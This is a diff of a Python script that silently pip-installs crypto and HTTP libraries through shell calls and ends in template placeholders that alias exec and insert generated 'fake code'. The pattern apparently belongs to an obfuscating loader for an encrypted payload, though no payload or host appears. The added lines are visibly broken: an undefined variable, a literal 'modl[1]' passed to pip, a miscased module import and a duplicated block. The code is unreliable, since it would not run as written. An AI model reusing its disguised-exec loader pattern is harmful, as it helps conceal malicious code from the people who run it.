@@ -143,15 +143,13 @@ except ImportError:
 import subprocess
 requirements = [
     ["requests", "requests"],
-    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
+    ["Crypto.Cipher", "pycryptodome"]
 ]
-for module in requirements:
-    try: 
-        __import__(module[0])
+for modl in requirements:
+    try: __import__(modl[0])
     except:
-        subprocess.Popen(executable+ " -m pip install " + module[1] + " --quiet", shell=True)
+        subprocess.Popen(fexecutable + " -m pip install modl[1]", shell=True)
         time.sleep(3)
-
 try:
     import cryptography
 except:
@@ -210,11 +208,21 @@ for module in ModuleRequirements:
         __import__(module[0])
     except:
         try:
-            subprocess.Popen(executable + " -m pip install Crypto --quiet", shell=True)
+            subprocess.Popen(executable + " -m pip install pycrypto --quiet", shell=True)
         except:
             subprocess.Popen(executable + " -m pip install pycryptodome --quiet", shell=True)
 
-from Cryptodome.Cipher import AES
+requirements = [
+    ["requests", "requests"],
+    ["Crypto.Cipher", "pycryptodome"]
+]
+for modl in requirements:
+    try: __import__(modl[0])
+    except:
+        subprocess.Popen(fexecutable + " -m pip install modl[1]", shell=True)
+        time.sleep(3)
+        
+from crypto.Cipher import AES
 from json import loads, dumps
 from urllib.request import Request, urlopen
 try:
@@ -233,11 +241,10 @@ except:
     subprocess.run("python -m pip install requests", shell=True)
 
 try:
-    from Cryptodome.Cipher import AES
+    from Crypto.Cipher import AES
 except:
     subprocess.run("python -m pip install Crypto.Cipher", shell=True)
     
-from Cryptodome.Cipher import AES
 from cryptography.fernet import Fernet
 {all_fake_code}
 {e} = exec
